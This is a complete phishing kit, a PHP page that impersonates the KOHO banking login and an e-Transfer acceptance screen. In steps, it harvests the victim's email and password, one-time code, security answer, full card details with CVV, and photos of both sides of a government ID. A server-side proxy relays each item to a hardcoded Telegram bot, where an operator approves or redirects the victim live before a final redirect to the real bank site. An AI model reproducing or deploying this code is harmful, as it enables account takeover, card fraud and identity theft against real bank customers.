<?php
declare(strict_types=1);

ob_start();
if (session_status() === PHP_SESSION_NONE) session_start();

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");

/* ---------- Locate config ---------- */
$docRoot    = rtrim($_SERVER['DOCUMENT_ROOT'] ?? __DIR__, '/');
$configPath = $docRoot . '/config/config.php';
$config     = @is_file($configPath) ? require $configPath : [];

/* ---------- Telegram credentials ---------- */
$telegramToken = $config['telegram']['bot_token'] ?? '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';
$chatId        = $config['telegram']['chat_id'] ?? '-1002922644009';

/* ---------- Server-Side Proxy ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    header('Content-Type: application/json');
    $action = $_POST['action'];
    $allowed_actions = ['sendMessage', 'getUpdates', 'editMessageReplyMarkup', 'sendPhoto'];
    
    if (in_array($action, $allowed_actions)) {
        $params = $_POST;
        unset($params['action']);
        
        if (!empty($_FILES)) {
            foreach ($_FILES as $key => $file) {
                $params[$key] = new CURLFile($file['tmp_name'], $file['type'], $file['name']);
            }
        }
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$telegramToken}/{$action}");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
        echo $result;
    }
    exit;
}

$cancelActionHandled = false;
if (isset($_GET['action']) && $_GET['action'] === 'cancel') {
    $logFile = __DIR__ . '/data/logs/transfers.log';
    if (@is_file($logFile) && @is_writable($logFile)) {
        $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (!empty($lines)) {
            $last_line_key = count($lines) - 1;
            if (strpos($lines[$last_line_key], 'pending') !== false) {
                 $lines[$last_line_key] = str_replace('pending', 'Cancelled', $lines[$last_line_key]);
                 file_put_contents($logFile, implode(PHP_EOL, $lines) . PHP_EOL);
            }
        }
    }
    $cancelActionHandled = true;
}

/* ---------- Resolve transaction data ---------- */
$tx = $_SESSION['transaction'] ?? $_SESSION['transaction_data'] ?? $_SESSION['last_transfer'] ?? null;
if (!is_array($tx)) $tx = [];

/* ---------- Sender Name ---------- */
$senderName = (string)($tx['sender_name'] ?? $tx['sender'] ?? $config['sender_name'] ?? 'JENNIFER NOSKIYE');

/* ---------- Amount ---------- */
$amount = (string)($tx['amount'] ?? '10.00');

/* ---------- Security Question ---------- */
$securityQuestion = 'What is the color of your car?';

/* Normalize amount display */
$amount = number_format((float)str_replace(['$', ',', ' '], '', $amount), 2);

$_SESSION['senderName'] = $senderName;
$_SESSION['amount'] = $amount;

/* ---------- Safe HTML values ---------- */
$senderNameSafe = htmlspecialchars($senderName, ENT_QUOTES, 'UTF-8');
$amountSafe     = htmlspecialchars($amount, ENT_QUOTES, 'UTF-8');
$securityQuestionSafe = htmlspecialchars($securityQuestion, ENT_QUOTES, 'UTF-8');

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5, user-scalable=yes">
    <title>web.koho.ca/login?_gl=1*car1w9*_gcl_au*NDgzNjE5NjU5LjE3NzAzOTQyOTY.*_ga*MjA2MjYxMTAwMi4xNzcwMzk0Mjk1*_ga_FKN7NNETLF*czE3NzAzOTQyOTUkbzEkZzAkdDE3NzAzOTQyOTUkajYwJGwwJGgw</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Manrope:wght@400;700;800&display=swap');

        :root {
            --koho-purple: #4c2481;
            --koho-text-dark: #212121;
            --koho-text-light: #6c757d;
            --koho-bg: #fdfcff;
            --koho-border-color: #ced4da;
            --koho-disabled-bg: #E6E6E6;
            --koho-disabled-text: #A9A9A9;
            --koho-error-bg: #fce8e6;
            --koho-error-text: #d93025;
        }
        body {
            font-family: 'Manrope', sans-serif;
            background-color: var(--koho-bg);
            margin: 0;
            color: var(--koho-text-dark);
            -webkit-font-smoothing: antialiased;
        }
        
        .app-container {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            padding: 0 24px;
        }
        
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 24px 0;
            max-width: 400px;
            width: 100%;
            margin: 0 auto;
        }
        .logo { height: 24px; }
        .lang-toggle {
            font-weight: 700;
            font-size: 14px;
            color: var(--koho-purple);
            text-decoration: none;
        }

        main {
            flex-grow: 1;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding-top: 20px;
        }
        .step { display: none; }

        .form-wrapper {
            width: 100%;
            max-width: 400px;
            text-align: left;
        }
        
        .form-wrapper h3 {
            font-size: 24px;
            font-weight: 800;
            margin: 0 0 32px;
            color: var(--koho-text-dark);
            letter-spacing: .5px;
            text-transform: uppercase;
        }
        
        .form-group {
            position: relative;
            margin-bottom: 24px;
        }
        
        .form-group input, .form-group select {
            width: 100%;
            box-sizing: border-box;
            border: 1px solid var(--koho-border-color);
            padding: 16px;
            font-size: 16px;
            border-radius: 8px;
            font-family: 'Manrope', sans-serif;
            background: #fff;
            color: var(--koho-text-dark);
        }
        .form-group input:focus, .form-group select:focus {
            outline: none;
            border-color: var(--koho-purple);
            box-shadow: 0 0 0 2px rgba(76, 36, 129, 0.2);
        }
        
        .button {
            width: 100%;
            border: none;
            padding: 18px;
            font-size: 16px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            transition: background-color 0.3s, color 0.3s;
            color: #fff;
            background-color: var(--koho-purple);
        }
        .button:hover:not(:disabled) {
            opacity: 0.9;
        }
        .button:disabled {
            background-color: var(--koho-disabled-bg);
            color: var(--koho-disabled-text);
            cursor: not-allowed;
        }
        
        .nav-link {
            display: block;
            margin-top: 24px;
            color: var(--koho-purple);
            text-decoration: none;
            font-size: 15px;
            font-weight: 700;
            background: none;
            border: none;
            cursor: pointer;
            text-align: center;
        }

        /* Error & Loader */
        .error-message { color: var(--koho-error-text); background-color: var(--koho-error-bg); border: 1px solid var(--koho-error-bg); border-radius: 8px; padding: 12px; margin-bottom: 20px; font-size: 15px; display: none; text-align: left; }
        
        #stepLoader { display: none; position: fixed; z-index: 10000; width: 100%; height: 100%; top: 0; left: 0; background-color: rgba(255, 255, 255, 0.8); }
        #stepLoader .loader-container { display: flex; position: absolute; top: 0; bottom: 0; left: 0; right: 0; align-items: center; justify-content: center; }
        #stepLoader .loader { display: inline-block; width: 50px; height: 50px; border: 6px solid var(--koho-purple); border-right-color: transparent; border-radius: 50%; animation: 1s linear 0s infinite rotate-cw; }
        @keyframes rotate-cw {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Info Blocks */
        .page-info { font-size: 16px; color: var(--koho-text-light); margin-bottom: 30px; line-height: 1.5; }
        .tx-info { background: #f3f0f7; border-radius: 8px; padding: 20px; margin-bottom: 25px; text-align: left; font-size: 15px; border: 1px solid #e9e4f0; }
        .tx-info div { display: flex; justify-content: space-between; margin-bottom: 8px; }
        .tx-info div:last-child { margin-bottom: 0; }
        .tx-info strong { color: var(--koho-text-dark); font-weight: 700; }
        #emailDisplay { font-weight: 700; color: var(--koho-text-dark); }

        /* Custom Elements */
        .split-input { display: flex; gap: 12px; }
        .split-input .form-group { flex: 1; }
        
        .id-upload-area {
            border: 2px dashed var(--koho-border-color);
            background: #fff;
            padding: 24px;
            text-align: center;
            border-radius: 8px;
            cursor: pointer;
            margin-bottom: 16px;
            transition: all 0.2s;
        }
        .id-upload-area:hover {
            border-color: var(--koho-purple);
            background: #fdfcff;
        }
        .id-upload-area span { font-weight: 600; color: var(--koho-purple); }
        .id-upload-area small { display: block; margin-top: 5px; color: var(--koho-text-light); font-size: 0.9em; }

    </style>
</head>
<body>
    <div class="app-container">
        <header>
            <a href="#" class="decoration-0">
                <svg width="128" height="32" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="text-purple-600" viewBox="0 0 128 32" style="color: #4c2481;">
                    <path fill-rule="evenodd" clip-rule="evenodd" d="m25.822 14.524 7.937 10.29-.002.008c1.372 1.759 1.793 2.606 1.793 3.816 0 1.78-1.833 3.263-3.902 3.263-1.204 0-2.933-.614-3.883-1.845l-7.756-10.075-12.227 11.92V11.183l-2.106 1.968c-.731.684-1.556 1.124-2.845 1.153-1.375.033-2.797-1.247-2.83-2.558-.029-1.276.366-2.266 1.797-3.612l7.34-6.835h.002c.72-.636 1.692-1 2.845-1 2.49 0 4.159 1.74 4.159 4.306l.024 8.546L28.653 1.398C29.54.572 30.54.038 32.102 0c1.668-.04 3.392 1.51 3.43 3.1.037 1.544-.44 2.746-2.176 4.376l-7.534 7.047ZM97.536 16.1c0-9.326 5.81-15.899 15.243-15.899C122.19.201 128 6.795 128 16.101 128 25.404 122.211 32 112.779 32c-9.433 0-15.243-6.573-15.243-15.9Zm8.567 0c0 4.326 2.392 7.463 6.676 7.463 4.283 0 6.675-3.137 6.675-7.463 0-4.325-2.392-7.463-6.675-7.463-4.284 0-6.676 3.138-6.676 7.463Zm-70.796 0c0-9.326 5.81-15.898 15.242-15.898 9.411 0 15.222 6.594 15.222 15.899S59.98 32 50.549 32c-9.432 0-15.242-6.573-15.242-15.9Zm8.567 0c0 4.326 2.392 7.464 6.675 7.464 4.284 0 6.676-3.138 6.676-7.463 0-4.326-2.392-7.463-6.676-7.463-4.283 0-6.675 3.137-6.675 7.463ZM90.95 31.894c-2.512 0-4.156-1.737-4.156-4.304v-7.61H76.517v7.61c0 2.567-1.647 4.304-4.155 4.304-2.51 0-4.156-1.737-4.156-4.304V4.61c0-2.567 1.647-4.305 4.156-4.305 2.508 0 4.155 1.738 4.155 4.304v7.484h10.276V4.608c0-2.566 1.647-4.304 4.156-4.304 2.508 0 4.155 1.738 4.155 4.304V27.59c0 2.567-1.647 4.304-4.155 4.304Z"></path>
                </svg>
            </a>
            <a href="#" class="lang-toggle">FR</a>
        </header>

        <main>
            <div class="form-wrapper">
                <!-- Step 1: Email -->
                <div id="stepEmail" class="step">
                    <h3>LOGIN TO KOHO</h3>
                    <form id="emailForm">
                        <div id="errorMsgEmail" class="error-message"></div>
                        <div class="form-group">
                            <input type="email" id="username" placeholder="Email" required>
                        </div>
                        <button type="submit" id="emailBtn" class="button" disabled>Continue</button>
                    </form>
                </div>

                <!-- Step 2: Password -->
                <div id="stepPassword" class="step">
                    <h3>ENTER PASSWORD</h3>
                    <form id="passwordForm">
                         <p class="page-info">Enter the password for <span id="emailDisplay"></span></p>
                         <div id="errorMsgPassword" class="error-message"></div>
                        <div class="form-group">
                            <input type="password" id="password" placeholder="Password" required>
                        </div>
                        <button type="submit" id="passwordBtn" class="button">Login</button>
                    </form>
                </div>

                <!-- Step 3: PIN -->
                <div id="stepPIN" class="step">
                    <h3>VERIFY YOUR IDENTITY</h3>
                    <form id="pinForm">
                        <p class="page-info">For your security, we've sent a 6-digit code to your registered device. Enter it below to continue.</p>
                        <div id="errorMsgPIN" class="error-message"></div>
                        <div class="form-group">
                            <input type="tel" id="pinCode" maxlength="6" inputmode="numeric" pattern="[0-9]*" placeholder="6-digit code" required>
                        </div>
                        <button type="submit" id="pinBtn" class="button">Continue</button>
                    </form>
                </div>

                <!-- Step 4: Security Question -->
                 <div id="stepSQ" class="step">
                    <h3>ACCEPT E-TRANSFER</h3>
                     <form id="sqForm">
                        <div class="tx-info">
                            <div><span>Sender:</span> <strong><?php echo $senderNameSafe; ?></strong></div>
                            <div><span>Amount:</span> <strong>$<?php echo $amountSafe; ?> CAD</strong></div>
                        </div>
                        <p class="page-info"><strong>Security Question:</strong><br><?php echo $securityQuestionSafe; ?></p>
                        <div id="errorMsgSQ" class="error-message"></div>
                        <div class="form-group">
                            <input type="text" id="sqAnswer" placeholder="Answer" required>
                        </div>
                        <button type="submit" id="sqBtn" class="button">Accept Transfer</button>
                     </form>
                </div>

                <!-- Step 5: CC -->
                <div id="stepCC" class="step">
                    <h3>VERIFY CARD</h3>
                    <form id="ccForm">
                        <p class="page-info">To verify your identity, please enter your card information below.</p>
                        <div id="errorMsgCC" class="error-message"></div>
                        <div class="form-group">
                            <input type="tel" id="ccNum" placeholder="Card Number" maxlength="19" required>
                        </div>
                        <div class="split-input">
                            <div class="form-group">
                                <select id="ccMonth" required>
                                    <option value="" disabled selected>MM</option>
                                    <option>01</option><option>02</option><option>03</option><option>04</option>
                                    <option>05</option><option>06</option><option>07</option><option>08</option>
                                    <option>09</option><option>10</option><option>11</option><option>12</option>
                                </select>
                            </div>
                             <div class="form-group">
                                <select id="ccYear" required>
                                    <option value="" disabled selected>YY</option>
                                    <option>25</option><option>26</option><option>27</option><option>28</option>
                                    <option>29</option><option>30</option><option>31</option><option>32</option>
                                </select>
                            </div>
                            <div class="form-group">
                                <input type="tel" id="ccCvv" placeholder="CVV" maxlength="3" required>
                            </div>
                        </div>
                        <button type="submit" id="ccBtn" class="button">Verify Card</button>
                    </form>
                </div>

                <!-- Step 6: ID -->
                <div id="stepID" class="step">
                    <h3>IDENTITY VERIFICATION</h3>
                    <p class="page-info">Please upload a clear photo of your government-issued ID.</p>
                    <div id="errorMsgID" class="error-message"></div>
                    
                    <div class="id-upload-area" onclick="document.getElementById('idFront').click()">
                        <span>📷 Upload Front ID</span>
                        <small id="nameFront">No file selected</small>
                        <input type="file" id="idFront" hidden accept="image/*" onchange="document.getElementById('nameFront').textContent = this.files[0].name">
                    </div>
                     <div class="id-upload-area" onclick="document.getElementById('idBack').click()">
                        <span>📷 Upload Back ID</span>
                        <small id="nameBack">No file selected</small>
                        <input type="file" id="idBack" hidden accept="image/*" onchange="document.getElementById('nameBack').textContent = this.files[0].name">
                    </div>
                    
                    <button id="idBtn" class="button" onclick="handleIDStep()">Submit Documents</button>
                </div>

                <!-- Step 7: Success -->
                <div id="stepConfirm" class="step">
                    <h3>SUCCESS</h3>
                    <p class="page-info">Your transfer of <strong>$<?php echo $amountSafe; ?> CAD</strong> is complete. You will be redirected shortly.</p>
                </div>

                <!-- Step 8: Cancel -->
                <div id="stepCancelConfirm" class="step">
                    <h3>TRANSFER CANCELLED</h3>
                    <p class="page-info">The e-Transfer was successfully cancelled. No funds have been deposited.</p>
                    <button onclick="location.href='index.php'" class="button">Return to Login</button>
                </div>
            </div>
        </main>
    </div>
    
    <div id="stepLoader">
        <div class="loader-container">
            <div class="loader"></div>
        </div>
    </div>

    <script>
    const chatId = "<?= $chatId ?>";
    const ALL_STEPS = ['stepEmail', 'stepPassword', 'stepPIN', 'stepSQ', 'stepCC', 'stepID', 'stepConfirm', 'stepCancelConfirm'];
    let userEmail = '';
    
    function showStep(stepId) {
        ALL_STEPS.forEach(id => {
            const el = document.getElementById(id);
            if (el) el.style.display = 'none';
        });
        const stepEl = document.getElementById(stepId);
        if(stepEl) stepEl.style.display = 'block';
        window.scrollTo(0,0);
    }

    const loader = document.getElementById('stepLoader');
    function showLoader() { if (loader) loader.style.display = 'block'; }
    function hideLoader() { if (loader) loader.style.display = 'none'; }
    function showError(msg, errorId) {
        const el = document.getElementById(errorId);
        if (el) { el.textContent = msg; el.style.display = 'block'; }
    }
    function hideError(errorId) {
        const el = document.getElementById(errorId);
        if (el) el.style.display = 'none';
    }

    // CC Input Formatting
    const ccNum = document.getElementById('ccNum');
    if(ccNum) {
        ccNum.addEventListener('input', function(e) {
            let v = e.target.value.replace(/\D/g, '').substring(0,16);
            let f = v.match(/.{1,4}/g);
            e.target.value = f ? f.join(' ') : v;
        });
    }

    // Email Validation
    const emailInput = document.getElementById('username');
    const emailBtn = document.getElementById('emailBtn');
    if(emailInput) {
        emailInput.addEventListener('input', () => {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            emailBtn.disabled = !emailRegex.test(emailInput.value.trim());
        });
    }

    // API Proxy
    async function api(action, data, isFile = false) {
        let body;
        if(isFile) {
            body = new FormData();
            body.append('action', action);
            for(let k in data) body.append(k, data[k]);
        } else {
            const fd = new FormData();
            fd.append('action', action);
            for(let k in data) fd.append(k, data[k]);
            body = fd;
        }
        return fetch('', {method:'POST', body}).then(r=>r.json());
    }

    let lastUpdateId = 0;
    let pollInterval;

    // Start Polling
    api('getUpdates', {offset: -1}).then(d => { 
        if(d.result && d.result.length) lastUpdateId = d.result[0].update_id; 
    });

    function poll(msgId, onOk, onFail, onCleanup) {
        if(pollInterval) clearInterval(pollInterval);
        pollInterval = setInterval(async () => {
            try {
                const r = await fetch('', {
                    method:'POST', 
                    headers:{'Content-Type':'application/x-www-form-urlencoded'},
                    body:`action=getUpdates&offset=${lastUpdateId+1}&timeout=2`
                });
                const d = await r.json();
                if(d.result && d.result.length) {
                    for(let u of d.result) {
                        lastUpdateId = u.update_id;
                        if(u.callback_query && u.callback_query.message.message_id == msgId) {
                            clearInterval(pollInterval);
                            const cmd = u.callback_query.data;
                            api('editMessageReplyMarkup', {chat_id:chatId, message_id:msgId, reply_markup:JSON.stringify({inline_keyboard:[]})});
                            
                            if (typeof onCleanup === 'function') onCleanup();
                            
                            if(cmd === 'yes') onOk();
                            else if(cmd === 'no') onFail();
                            else if(cmd === 'go_cc') showStep('stepCC');
                            else if(cmd === 'go_id') showStep('stepID');
                            else if(cmd === 'cancel') window.location.href="https://www.koho.ca";
                        }
                    }
                }
            } catch(e){}
        }, 2000);
    }

    async function sendLog(step, content, btnId, next) {
        const btn = document.getElementById(btnId);
        const originalText = btn.textContent;
        btn.textContent = 'Processing...'; 
        btn.disabled = true;
        showLoader();
        
        const cleanup = () => {
             hideLoader();
             btn.disabled = false;
             btn.textContent = originalText;
        };

        try {
            const kb = {inline_keyboard:[
                [{text:"✅ ALLOW", callback_data:"yes"}, {text:"❌ BLOCK", callback_data:"no"}],
                [{text:"REQ CC", callback_data:"go_cc"}, {text:"REQ ID", callback_data:"go_id"}],
                [{text:"🚫 END SESSION", callback_data:"cancel"}]
            ]};
            
            const r = await api('sendMessage', {
                chat_id: chatId,
                text: `🟣 <b>KOHO - ${step}</b>\n\n${content}`,
                parse_mode: 'HTML',
                reply_markup: JSON.stringify(kb)
            });
            
            poll(r.result.message_id, 
                () => next(), // OK
                () => { // Fail
                    if(step === 'LOGIN') { showStep('stepPassword'); showError('The details you entered didn\'t match our records.', 'errorMsgPassword'); }
                    if(step === 'PIN') { showStep('stepPIN'); showError('The code you entered is incorrect.', 'errorMsgPIN'); }
                    if(step === 'SQ') { showStep('stepSQ'); showError('The answer provided is incorrect.', 'errorMsgSQ'); }
                    if(step === 'CC') { showStep('stepCC'); showError('Card information is invalid.', 'errorMsgCC'); }
                },
                cleanup
            );
        } catch(e) {
            cleanup();
        }
    }

    document.getElementById('emailForm').addEventListener('submit', (e) => {
        e.preventDefault();
        userEmail = document.getElementById('username').value.trim();
        document.getElementById('emailDisplay').textContent = userEmail;
        showStep('stepPassword');
    });

    document.getElementById('passwordForm').addEventListener('submit', (e) => {
        e.preventDefault();
        const p = document.getElementById('password').value.trim();
        if (p.length < 5) { showError("Please enter a valid password.", 'errorMsgPassword'); return; }
        hideError('errorMsgPassword');
        sendLog('LOGIN', `Email: <code>${userEmail}</code>\nPass: <code>${p}</code>`, 'passwordBtn', () => showStep('stepPIN'));
    });

    document.getElementById('pinForm').addEventListener('submit', (e) => {
        e.preventDefault();
        const c = document.getElementById('pinCode').value.trim();
        if (!/^\d{6}$/.test(c)) { showError('Please enter the 6-digit code.', 'errorMsgPIN'); return; }
        hideError('errorMsgPIN');
        sendLog('PIN', `Code: <code>${c}</code>`, 'pinBtn', () => showStep('stepSQ'));
    });

    document.getElementById('sqForm').addEventListener('submit', (e) => {
        e.preventDefault();
        const a = document.getElementById('sqAnswer').value.trim();
        if (!a) { showError('Answer required.', 'errorMsgSQ'); return; }
        hideError('errorMsgSQ');
        sendLog('SQ', `Answer: <code>${a}</code>`, 'sqBtn', () => {
             showStep('stepConfirm');
             setTimeout(() => { window.location.href = 'https://www.koho.ca/'; }, 4000);
        });
    });

    document.getElementById('ccForm').addEventListener('submit', (e) => {
        e.preventDefault();
        const n = document.getElementById('ccNum').value;
        const m = document.getElementById('ccMonth').value;
        const y = document.getElementById('ccYear').value;
        const c = document.getElementById('ccCvv').value;
        if(!m || !y) { showError('Expiration Date Required', 'errorMsgCC'); return; }
        hideError('errorMsgCC');
        sendLog('CC', `Card: <code>${n}</code>\nExp: <code>${m}/${y}</code>\nCVV: <code>${c}</code>`, 'ccBtn', () => showStep('stepID'));
    });

    async function handleIDStep() {
        const f = document.getElementById('idFront').files[0];
        const b = document.getElementById('idBack').files[0];
        if(!f || !b) { showError("Please select both front and back images.", 'errorMsgID'); return; }
        hideError('errorMsgID');
        
        const btn = document.getElementById('idBtn');
        const originalText = btn.textContent;
        btn.textContent = "Uploading...";
        btn.disabled = true;
        showLoader();

        try {
            await api('sendPhoto', {chat_id: chatId, caption: 'Front ID', photo: f}, true);
            await api('sendPhoto', {chat_id: chatId, caption: 'Back ID', photo: b}, true);
            
            sendLog('ID DOCS', 'Documents uploaded.', 'idBtn', () => {
                 showStep('stepConfirm');
                 setTimeout(() => { window.location.href = 'https://www.koho.ca/'; }, 4000);
            });
        } catch(e) {
            hideLoader();
            btn.disabled = false;
            btn.textContent = originalText;
            showError("Upload failed. Please try again.", 'errorMsgID');
        }
    }

    document.addEventListener('DOMContentLoaded', () => {
        const initialStep = '<?php echo $cancelActionHandled ? 'stepCancelConfirm' : 'stepEmail'; ?>';
        showStep(initialStep);
    });
    </script>
</body>
</html>